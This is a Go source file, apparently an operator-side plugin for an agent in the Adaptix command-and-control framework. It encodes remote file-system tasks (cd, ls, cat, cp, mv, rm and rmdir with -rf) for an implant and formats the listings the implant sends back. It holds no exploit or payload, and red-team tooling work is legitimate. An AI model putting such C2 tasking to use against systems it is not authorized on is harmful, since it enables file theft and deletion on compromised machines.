package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

const maxPathBytes = 512

func buildPathCmd(cmdId byte, cmdName string, path string) ([]byte, error) {
	pathBytes := []byte(path)
	if len(pathBytes) > maxPathBytes {
		return nil, fmt.Errorf("nonameax: %s: path too long (max %d bytes)", cmdName, maxPathBytes)
	}
	data := make([]byte, 5+len(pathBytes))
	data[0] = cmdId
	binary.LittleEndian.PutUint32(data[1:5], uint32(len(pathBytes)))
	copy(data[5:], pathBytes)
	return data, nil
}

func buildTwoPathCmd(cmdId byte, cmdName string, src string, dst string) ([]byte, error) {
	srcBytes := []byte(src)
	dstBytes := []byte(dst)
	if len(srcBytes) > maxPathBytes || len(dstBytes) > maxPathBytes {
		return nil, fmt.Errorf("nonameax: %s: path too long (max %d bytes)", cmdName, maxPathBytes)
	}
	argsLen := len(srcBytes) + 1 + len(dstBytes)
	data := make([]byte, 5+argsLen)
	data[0] = cmdId
	binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
	copy(data[5:], srcBytes)
	data[5+len(srcBytes)] = 0x00
	copy(data[5+len(srcBytes)+1:], dstBytes)
	return data, nil
}

func buildPathCmdFlags(cmdId byte, cmdName string, path string, recursive bool) ([]byte, error) {
	pathBytes := []byte(path)
	if len(pathBytes) > maxPathBytes {
		return nil, fmt.Errorf("nonameax: %s: path too long (max %d bytes)", cmdName, maxPathBytes)
	}
	flags := byte(0x00)
	if recursive {
		flags = 0x01
	}
	data := make([]byte, 5+1+len(pathBytes))
	data[0] = cmdId
	binary.LittleEndian.PutUint32(data[1:5], uint32(1+len(pathBytes)))
	data[5] = flags
	copy(data[6:], pathBytes)
	return data, nil
}

func cmdCd(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	path, err := adaptix.GetStringArg(args, "path")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: cd: 'path' argument required")
	}
	data, err := buildPathCmd(CMD_CD, "cd", path)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("cd to %s task queued", path)}
	return task, msg, nil
}

func cmdPwd(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	task := adaptix.TaskData{
		Type: taskTypeTask,
		Data: []byte{CMD_PWD, 0x00, 0x00, 0x00, 0x00},
		Sync: true,
	}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "pwd task queued"}
	return task, msg, nil
}

func cmdMkdir(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	path, err := adaptix.GetStringArg(args, "path")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: mkdir: 'path' argument required")
	}
	data, err := buildPathCmd(CMD_MKDIR, "mkdir", path)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("mkdir %s task queued", path)}
	return task, msg, nil
}

func cmdRmdir(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	path, err := adaptix.GetStringArg(args, "path")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: rmdir: 'path' argument required")
	}
	rf := adaptix.GetBoolArg(args, "-rf")
	data, err := buildPathCmdFlags(CMD_RMDIR, "rmdir", path, rf)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	label := fmt.Sprintf("rmdir %s task queued", path)
	if rf {
		label = fmt.Sprintf("rmdir -rf %s task queued", path)
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
	return task, msg, nil
}

func cmdRm(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	path, err := adaptix.GetStringArg(args, "path")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: rm: 'path' argument required")
	}
	rf := adaptix.GetBoolArg(args, "-rf")
	data, err := buildPathCmdFlags(CMD_RM, "rm", path, rf)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	label := fmt.Sprintf("rm %s queued", path)
	if rf {
		label = fmt.Sprintf("rm -rf %s queued", path)
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: label}
	return task, msg, nil
}

func cmdCp(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	src := adaptix.GetStringArgDefault(args, "src", "")
	dst := adaptix.GetStringArgDefault(args, "dst", "")
	if src == "" || dst == "" {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: cp: 'src' and 'dst' arguments required")
	}
	data, err := buildTwoPathCmd(CMD_CP, "cp", src, dst)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("cp %s -> %s queued", src, dst)}
	return task, msg, nil
}

func cmdMv(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	src := adaptix.GetStringArgDefault(args, "src", "")
	dst := adaptix.GetStringArgDefault(args, "dst", "")
	if src == "" || dst == "" {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: mv: 'src' and 'dst' arguments required")
	}
	data, err := buildTwoPathCmd(CMD_MV, "mv", src, dst)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("mv %s -> %s queued", src, dst)}
	return task, msg, nil
}

func cmdCat(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	path, err := adaptix.GetStringArg(args, "path")
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: cat: 'path' argument required")
	}
	data, err := buildPathCmd(CMD_CAT, "cat", path)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("cat %s task queued", path)}
	return task, msg, nil
}

func cmdLs(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	path := adaptix.GetStringArgDefault(args, "path", "")
	recursive := adaptix.GetBoolArg(args, "-r")
	data, err := buildPathCmdFlags(CMD_LS, "ls", path, recursive)
	if err != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, err
	}
	lsMsg := "ls (current directory) task queued"
	if recursive && path != "" {
		lsMsg = fmt.Sprintf("ls -r %s task queued", path)
	} else if recursive {
		lsMsg = "ls -r (current directory) task queued"
	} else if path != "" {
		lsMsg = fmt.Sprintf("ls %s task queued", path)
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: lsMsg}
	return task, msg, nil
}

/* ========= [ result decoders ] ========= */

func decodeLsResult(data []byte) (string, string) {
	if len(data) < 4 {
		return "ls: empty result", ""
	}
	pathLen := int(binary.LittleEndian.Uint16(data[0:2]))
	if 2+pathLen+2 > len(data) {
		return "ls: malformed result", ""
	}
	path := string(data[2 : 2+pathLen])
	count := int(binary.LittleEndian.Uint16(data[2+pathLen : 4+pathLen]))
	pos := 4 + pathLen

	type lsEntry struct {
		isDir bool
		attrs byte
		size  uint32
		mtime uint32
		name  string
	}

	var dirs, files []lsEntry
	for i := 0; i < count; i++ {
		if pos+11 > len(data) {
			break
		}
		e := lsEntry{
			isDir: data[pos] != 0,
			attrs: data[pos+1],
			size:  binary.LittleEndian.Uint32(data[pos+2 : pos+6]),
			mtime: binary.LittleEndian.Uint32(data[pos+6 : pos+10]),
		}
		nlen := int(data[pos+10])
		if pos+11+nlen > len(data) {
			break
		}
		e.name = string(data[pos+11 : pos+11+nlen])
		pos += 11 + nlen
		if e.isDir {
			dirs = append(dirs, e)
		} else {
			files = append(files, e)
		}
	}

	all := append(dirs, files...)

	header := fmt.Sprintf(" %-8s %-5s %-14s %-20s  %s\n",
		"Type", "Attr", "Size", "Last Modified", "Name")
	header += fmt.Sprintf(" %-8s %-5s %-14s %-20s  %s",
		"----", "----", "---------", "----------------", "----")

	body := ""
	for _, e := range all {
		t := time.Unix(int64(e.mtime), 0).UTC()
		ts := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())
		typeStr := ""
		if e.isDir {
			typeStr = "dir"
		}
		attrStr := lsAttrString(e.attrs, e.isDir)
		sizeStr := ""
		if !e.isDir {
			sizeStr = sizeBytesToFormat(int64(e.size))
		}
		body += fmt.Sprintf("\n %-8s %-5s %-14s %-20s  %s", typeStr, attrStr, sizeStr, ts, e.name)
	}

	msg := fmt.Sprintf("Listing '%s' (%d entries)", path, len(all))
	return msg, header + body
}

func lsAttrString(attrs byte, isDir bool) string {
	d := '-'
	if isDir {
		d = 'd'
	}
	h := '-'
	if attrs&0x02 != 0 {
		h = 'h'
	}
	s := '-'
	if attrs&0x04 != 0 {
		s = 's'
	}
	r := '-'
	if attrs&0x01 != 0 {
		r = 'r'
	}
	return fmt.Sprintf("%c%c%c%c", d, h, s, r)
}

func sizeBytesToFormat(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}
